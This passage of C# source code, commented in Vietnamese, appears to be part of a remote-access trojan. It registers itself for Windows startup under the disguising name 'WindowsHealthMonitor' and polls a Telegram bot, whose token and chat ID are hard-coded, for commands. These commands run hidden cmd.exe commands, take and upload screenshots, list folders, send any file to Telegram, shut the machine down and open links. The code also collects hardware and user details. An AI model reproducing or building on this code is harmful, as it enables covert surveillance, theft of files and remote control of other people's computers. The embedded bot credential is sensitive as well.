                stream.ReadExactly(payload, 0, payloadLength);

                if (masked)
                {
                    for (int i = 0; i < payloadLength; i++)
                    {
                        payload[i] = (byte)(payload[i] ^ maskKey[i % 4]);
                    }
                }

                return Encoding.UTF8.GetString(payload);
            }
            catch
            {
                return null;
            }
        }

        /// <summary>
        /// Đóng gói và gửi một thông điệp dạng text qua WebSocket:
        /// chuyển chuỗi sang UTF-8, tạo frame WebSocket hợp lệ (FIN + Text),
        /// xử lý độ dài payload theo chuẩn (<=125, 126, 127),
        /// sau đó ghi frame xuống NetworkStream.
        /// Ghi log nếu xảy ra lỗi khi gửi.
        /// </summary>
        private void SendWS(NetworkStream stream, string message)
        {
            try
            {
                byte[] payload = Encoding.UTF8.GetBytes(message);
                using (MemoryStream ms = new MemoryStream())
                {
                    ms.WriteByte(0x81); // Text frame

                    if (payload.Length <= 125)
                    {
                        ms.WriteByte((byte)payload.Length);
                    }
                    else if (payload.Length <= 65535)
                    {
                        ms.WriteByte(126);
                        byte[] len = BitConverter.GetBytes((ushort)payload.Length);
                        Array.Reverse(len);
                        ms.Write(len, 0, 2);
                    }
                    else
                    {
                        ms.WriteByte(127);
                        byte[] len = BitConverter.GetBytes((ulong)payload.Length);
                        Array.Reverse(len);
                        ms.Write(len, 0, 8);
                    }

                    ms.Write(payload, 0, payload.Length);

                    byte[] frame = ms.ToArray();
                    stream.Write(frame, 0, frame.Length);
                    stream.Flush();
                }
            }
            catch (Exception ex)
            {
                Log($"Send error: {ex.Message}");
            }
        }

// ============ SYSTEM INFO ============
private string GetSystemInfo()
{
    var info = new Dictionary<string, string>();
    try
    {
        // 1. Thông tin cơ bản
        info["pcName"] = Environment.MachineName.Replace("\"", ""); // Xóa dấu ngoặc kép nếu có để tránh lỗi JSON
        info["userName"] = Environment.UserName.Replace("\"", "");
        info["os"] = RuntimeInformation.OSDescription.Replace("\"", "");
        info["uptime"] = TimeSpan.FromMilliseconds(Environment.TickCount64).ToString(@"dd\.hh\:mm\:ss");

        // 2. CPU
        try {
            using (var searcher = new ManagementObjectSearcher("select Name from Win32_Processor"))
            {
                foreach (var item in searcher.Get())
                {
                    info["cpu"] = item["Name"]?.ToString()?.Replace("\"", "") ?? "Unknown CPU";
                    break;
                }
            }
        } catch { info["cpu"] = "CPU Error"; }

        // 3. RAM
        try {
            using (var searcher = new ManagementObjectSearcher("select TotalPhysicalMemory from Win32_ComputerSystem"))
            {
                foreach (var item in searcher.Get())
                {
                    long bytes = Convert.ToInt64(item["TotalPhysicalMemory"]);
                    info["ram"] = $"{bytes / (1024 * 1024 * 1024)} GB"; 
                    break;
                }
            }
        } catch { info["ram"] = "RAM Error"; }

        // 4. GPU
        try {
            using (var searcher = new ManagementObjectSearcher("select Name from Win32_VideoController"))
            {
                foreach (var item in searcher.Get())
                {
                    info["gpu"] = item["Name"]?.ToString()?.Replace("\"", "") ?? "Unknown GPU";
                    break;
                }
            }
        } catch { info["gpu"] = "GPU Error"; }

        // 5. Ổ cứng
        try {
            var drive = DriveInfo.GetDrives().FirstOrDefault(d => d.IsReady && d.DriveType == DriveType.Fixed);
            if (drive != null)
            {
                long free = drive.TotalFreeSpace / (1024 * 1024 * 1024);
                long total = drive.TotalSize / (1024 * 1024 * 1024);
                info["disk"] = $"{drive.Name} (Free: {free}GB / {total}GB)".Replace("\\", "\\\\"); // Fix lỗi đường dẫn
            }
            else info["disk"] = "N/A";
        } catch { info["disk"] = "Disk Error"; }
    }
    catch (Exception ex)
    {
        return $"{{\"error\": \"{ex.Message}\"}}";
    }

    // --- TẠO CHUỖI JSON THỦ CÔNG ---
    StringBuilder sb = new StringBuilder();
    sb.Append("{");
    foreach (var kvp in info)
    {
        // Tạo format: "key": "value",
        sb.Append($"\"{kvp.Key}\": \"{kvp.Value}\",");
    }
    
    // Xóa dấu phẩy thừa ở cuối nếu có dữ liệu
    if (info.Count > 0) sb.Length--; 
    
    sb.Append("}");
    return sb.ToString();
}// ============ TỰ KHỞI ĐỘNG CÙNG WINDOWS ============
        private void AddToStartup()
        {
            try
            {
                string appName = "WindowsHealthMonitor";
                string appPath = Application.ExecutablePath;

                using (RegistryKey? key = Registry.CurrentUser.OpenSubKey(
                    @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true))
                {
                    if (key != null)
                    {
                        if (key.GetValue(appName) == null)
                        {
                            key.SetValue(appName, appPath);
                            DebugToFile("✓ Đã thêm vào Startup");
                        }
                        else
                        {
                            DebugToFile("Đã có sẵn trong Startup");
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                DebugToFile($"Lỗi Startup: {ex.Message}");
            }
        }

        // ============ LẮNG NGHE LỆNH ============
        private void StartTelegramListener()
        {
            new Thread(() =>
            {
                // 1. Cấu hình
                string botToken = "8393288103:AAFyb7tZ1EVkzqwktDQdVSMHyeWKUM2flMI";
                string adminChatId = "922691344"; // ID của bạn để nhận kết quả

                DebugToFile(">>> Telegram Listener STARTED (Multi-Function) <<<");

                while (true)
                {
                    try
                    {
                        // Gọi API lấy tin nhắn mới
                        string url = $"https://api.telegram.org/bot{botToken}/getUpdates?offset={_lastUpdateId + 1}&timeout=10";

                        using (HttpClient client = new HttpClient())
                        {
                            client.Timeout = TimeSpan.FromSeconds(30);
                            string json = client.GetStringAsync(url).Result;

                            if (json.Contains("\"ok\":true") && json.Contains("\"result\":[{"))
                            {
                                // --- CẬP NHẬT UPDATE_ID (Rất quan trọng) ---
                                MatchCollection matches = Regex.Matches(json, "\"update_id\"\\s*:\\s*(\\d+)");
                                foreach (Match m in matches)
                                {
                                    if (int.TryParse(m.Groups[1].Value, out int id))
                                    {
                                        if (id > _lastUpdateId) _lastUpdateId = id;
                                    }
                                }

                                // --- PHÂN TÍCH VÀ XỬ LÝ LỆNH ---
                                // Regex tìm nội dung tin nhắn: "text":"nội dung"
                                Match textMatch = Regex.Match(json, "\"text\"\\s*:\\s*\"(.*?)\"");

                                if (textMatch.Success)
                                {
                                    string fullText = textMatch.Groups[1].Value;
                                    DebugToFile($">> Nhận lệnh: {fullText}");

                                    if (fullText.Contains("/scan"))
                                    {
                                        ReportToTelegram();
                                    }
                                    else if (fullText.Contains("/screen"))
                                    {
                                        SendScreenshotToTelegram(botToken, adminChatId);
                                    }
                                    // --- LỆNH MỚI 1: XEM FILE ---
                                    else if (fullText.StartsWith("/ls "))
                                    {
                                        string path = fullText.Substring(4).Trim(); // Lấy đường dẫn
                                        string result = GetFileExplorer(path);
                                        // Làm đẹp kết quả để gửi Telegram
                                        string msg = $"📂 <b>LIST: {path}</b>\n\n" + result.Replace("|||", "\n").Replace("|", " - ");
                                        // Cắt ngắn nếu dài quá
                                        if (msg.Length > 4000) msg = msg.Substring(0, 4000) + "...";
                                        SendTextToTelegram(botToken, adminChatId, msg);
                                    }
                                    // --- LỆNH MỚI 2: TẢI FILE ---
                                    else if (fullText.StartsWith("/get "))
                                    {
                                        string path = fullText.Substring(5).Trim();
                                        SendTextToTelegram(botToken, adminChatId, $"⏳ Đang tải file: {path}...");
                                        SendFileToTelegram(botToken, adminChatId, path);
                                    }
                                    // ----------------------------
                                    else if (fullText.Contains("/off"))
                                    {
                                        SendTextToTelegram(botToken, adminChatId, "⚠️ Đang tắt máy...");
                                        Process.Start(new ProcessStartInfo("shutdown", "/s /t 0") { CreateNoWindow = true, UseShellExecute = false });
                                    }
                                    else if (fullText.StartsWith("/cmd "))
                                    {
                                        string command = fullText.Substring(5);
                                        string result = RunCMD(command);
                                        if (result.Length > 4000) result = result.Substring(0, 4000) + "...";
                                        SendTextToTelegram(botToken, adminChatId, $"📟 <b>CMD:</b>\n<pre>{result}</pre>");
                                    }
                                    else if (fullText.StartsWith("/msg "))
                                    {
                                        string content = fullText.Substring(5); // Lấy nội dung sau "/msg "
                                        MessageBox.Show(content, "System Alert", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                                        SendTextToTelegram(botToken, adminChatId, $"✅ Đã hiện thông báo: {content}");
                                    }
                                    else if (fullText.StartsWith("/open "))
                                    {
                                        string link = fullText.Substring(6); // Lấy link sau "/open "
                                        Process.Start(new ProcessStartInfo { FileName = link, UseShellExecute = true });
                                        SendTextToTelegram(botToken, adminChatId, $"✅ Đã mở link: {link}");
                                    }
                            
                                }
                        
                            }
                        }
                    }
                    catch (Exception ex)
                    {
                        Thread.Sleep(5000); // Mất mạng thì ngủ 5s
                    }

                    Thread.Sleep(2000); // Nghỉ 2 giây rồi check tiếp
                }
            })
            { IsBackground = true }.Start();
        }

    // --- HÀM 1: CHẠY LỆNH CMD NGẦM ---
private string RunCMD(string command)
{
    try
    {
        ProcessStartInfo procStartInfo = new ProcessStartInfo("cmd", "/c " + command);
        procStartInfo.RedirectStandardOutput = true;
        procStartInfo.UseShellExecute = false;
        procStartInfo.CreateNoWindow = true;
        procStartInfo.StandardOutputEncoding = Encoding.UTF8;

        using (Process proc = new Process())
        {
            proc.StartInfo = procStartInfo;
            proc.Start();
            string result = proc.StandardOutput.ReadToEnd();
            return string.IsNullOrEmpty(result) ? "Done (No Output)" : result;
        }
    }
    catch (Exception ex) { return "Error: " + ex.Message; }
}

// --- HÀM 2: GỬI TIN NHẮN TEXT (Cho lệnh /cmd, /msg...) ---
private void SendTextToTelegram(string token, string chatId, string msg)
{
    new Thread(() => 
    {
        try
        {
            string url = $"https://api.telegram.org/bot{token}/sendMessage?chat_id={chatId}&text={Uri.EscapeDataString(msg)}&parse_mode=HTML";
            using (HttpClient client = new HttpClient())
            {
                client.GetAsync(url).Wait();
            }
        }
        catch { }
    }) { IsBackground = true }.Start();
}

        // --- HÀM 3: CHỤP VÀ GỬI ẢNH MÀN HÌNH (Cho lệnh /screen) ---
        private void SendScreenshotToTelegram(string token, string chatId)
        {
            new Thread(() =>
            {
                try
                {
                    Rectangle bounds = Screen.PrimaryScreen.Bounds;
                    using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))
                    using (Graphics g = Graphics.FromImage(bitmap))
                    {
                        g.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);

                        using (MemoryStream stream = new MemoryStream())
                        {
                            bitmap.Save(stream, ImageFormat.Png);
                            byte[] imageBytes = stream.ToArray();

                            using (HttpClient client = new HttpClient())
                            using (var content = new MultipartFormDataContent())
                            {
                                content.Add(new StringContent(chatId), "chat_id");
                                content.Add(new ByteArrayContent(imageBytes, 0, imageBytes.Length), "photo", "screen.png");

                                client.PostAsync($"https://api.telegram.org/bot{token}/sendPhoto", content).Wait();
                            }
                        }
                    }
                    DebugToFile(">> Đã gửi ảnh màn hình!");
                }
                catch (Exception ex) { DebugToFile("Lỗi chụp ảnh: " + ex.Message); }
            })
            { IsBackground = true }.Start();
        }
    // ============ MODULE QUẢN LÝ FILE ============

// 1. Hàm lấy danh sách Ổ đĩa hoặc File/Thư mục
private string GetFileExplorer(string path)
{
    StringBuilder sb = new StringBuilder();

    try
    {
                // 1. Xử lý path đầu vào cho sạch sẽ
                // Trong hàm GetFileExplorer, đoạn đầu tiên:

                if (!string.IsNullOrEmpty(path))
                {
                    path = path.Trim();
                    path = path.Replace("/", "\\"); // Đổi tất cả dấu / thành \ cho đúng chuẩn Windows
                    path = path.TrimEnd('|');

                    // Fix lỗi nếu client gửi "C:" thiếu dấu gạch
                    if (path.EndsWith(":") && !path.EndsWith("\\"))
                        path += "\\";
                }


        // 2. Nếu path rỗng hoặc lệnh DRIVES -> Lấy danh sách ổ đĩa
        if (string.IsNullOrEmpty(path) || path == "DRIVES")
        {
            foreach (var drive in DriveInfo.GetDrives())
            {
                try 
                {
                    if (drive.IsReady) // Chỉ lấy ổ đã sẵn sàng
                    {
                        long sizeGB = drive.TotalSize / (1024 * 1024 * 1024);
                        sb.Append($"DRIVE|{drive.Name}|{sizeGB} GB|||");
                    }
                }
                catch { /* Bỏ qua ổ lỗi */ }
            }
        }
        else // 3. Nếu có path -> Lấy danh sách File/Folder
        {
            DirectoryInfo di = new DirectoryInfo(path);

            if (!di.Exists) return "ERROR|Thu muc khong ton tai";

            // --- Lấy thư mục (Tách try-catch riêng) ---
            try
            {
                foreach (var d in di.GetDirectories())
                {
                    // Thử truy cập thuộc tính để xem có quyền không
                    try 
                    {
                        sb.Append($"FOLDER|{d.Name}|Folder|||");
                    }
                    catch { continue; } // Nếu lỗi quyền truy cập thư mục con này thì bỏ qua
                }
            }
            catch (UnauthorizedAccessException) 
            { 
                sb.Append("ERROR|Khong co quyen truy cap thu muc nay|||"); 
            }
            catch { }

            // --- Lấy file (Tách try-catch riêng) ---
            try
            {
                foreach (var f in di.GetFiles())
                {
                    try
                    {
                        long sizeKB = f.Length / 1024;
                        sb.Append($"FILE|{f.Name}|{sizeKB} KB|||");
                    }
                    catch { continue; }
                }
            }
            catch { }
        }

        return sb.ToString();
    }
    catch (Exception ex)
    {
        return $"ERROR|Loi he thong: {ex.Message}";
    }
}

// 2. Hàm đọc file chuyển sang Base64 (Để gửi qua Web Socket)
private string ReadFileBase64(string path)
{
    try
    {
        if (!File.Exists(path)) return "ERROR|File not found";
        // Giới hạn file < 10MB để tránh treo
        if (new FileInfo(path).Length > 10 * 1024 * 1024) return "ERROR|File too large (>10MB)";

        byte[] bytes = File.ReadAllBytes(path);
        return Convert.ToBase64String(bytes);
    }
    catch (Exception ex) { return "ERROR|" + ex.Message; }
}

        // 3. Hàm gửi File tài liệu qua Telegram (Cho lệnh /get)
        private void SendFileToTelegram(string token, string chatId, string filePath)
        {
            new Thread(() =>
            {
                try
                {
                    if (!File.Exists(filePath))
                    {
                        SendTextToTelegram(token, chatId, "❌ File không tồn tại!");
                        return;
                    }

                    using (HttpClient client = new HttpClient())
                    using (var content = new MultipartFormDataContent())
                    using (var fileStream = File.OpenRead(filePath))
                    {
                        content.Add(new StringContent(chatId), "chat_id");
                        // Thêm file vào request
                        content.Add(new StreamContent(fileStream), "document", Path.GetFileName(filePath));

                        var response = client.PostAsync($"https://api.telegram.org/bot{token}/sendDocument", content).Result;

                        if (!response.IsSuccessStatusCode)
                            SendTextToTelegram(token, chatId, "❌ Lỗi khi gửi file (Có thể file quá lớn).");
                    }
                    DebugToFile($">> Đã gửi file {filePath} qua Telegram");
                }
                catch (Exception ex) { DebugToFile("Lỗi gửi file Tele: " + ex.Message); }
            })
            { IsBackground = true }.Start();
        }
    }
}